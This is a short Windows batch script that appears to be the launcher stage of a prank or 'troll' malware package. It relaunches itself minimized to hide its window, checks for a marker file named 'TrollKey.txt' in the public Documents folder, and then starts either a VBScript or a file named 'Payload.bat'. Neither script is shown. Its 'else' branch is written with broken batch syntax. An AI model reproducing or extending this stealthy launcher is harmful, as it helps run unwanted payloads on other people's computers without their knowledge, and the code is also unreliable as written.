if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
if Exist "C:\Users\Public\Documents\TrollKey.txt" (
	cscript aace.vbs
	exit
)
else(
	start Payload.bat
	exit
)
